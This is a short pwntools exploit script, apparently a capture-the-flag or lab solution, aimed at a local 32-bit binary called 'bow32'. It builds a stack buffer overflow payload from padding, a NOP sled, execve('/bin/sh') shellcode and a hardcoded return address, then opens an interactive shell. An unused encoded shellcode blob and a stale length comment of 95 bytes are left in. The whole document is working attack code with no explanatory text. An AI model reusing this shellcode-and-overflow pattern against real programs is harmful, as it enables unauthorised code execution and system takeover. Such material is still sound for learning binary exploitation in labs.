from pwn import *


shellcode = b""
shellcode += b"\xd9\xc9\xbe\x4f\x9e\x88\xa8\xd9\x74\x24\xf4\x5f\x29\xc9"
shellcode += b"\xb1\x12\x83\xef\xfc\x31\x77\x13\x03\x38\x8d\x6a\x5d\xf7"
shellcode += b"\x6a\x9d\x7d\xa4\xcf\x31\xe8\x48\x59\x54\x5c\x2a\x94\x17"
shellcode += b"\x0e\xeb\x96\x27\xfc\x8b\x9e\x2e\x07\xe3\x5f\xd1\xf7\xf2"
shellcode += b"\xf7\xd3\xf7\x8e\x6e\x5d\x16\xde\x17\x0d\x88\x4d\x6b\xae"
shellcode += b"\xa3\x90\x46\x31\xe1\x3a\x37\x1d\x75\xd2\xaf\x4e\x56\x40"
shellcode += b"\x59\x18\x4b\xd6\xca\x93\x6d\x66\xe7\x6e\xed"

shellcode = b"\x6a\x0b\x58\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
# len shellcode = 95

io = process("./bow32")
payload = b"a" * (1036 - 22 - 200) + b"\x90" * 200 + shellcode + b"\x83\xd0\xff\xff"

f = open("input", "wb+")
f.write(payload)

io.sendline(payload)

io.interactive()
io.close()
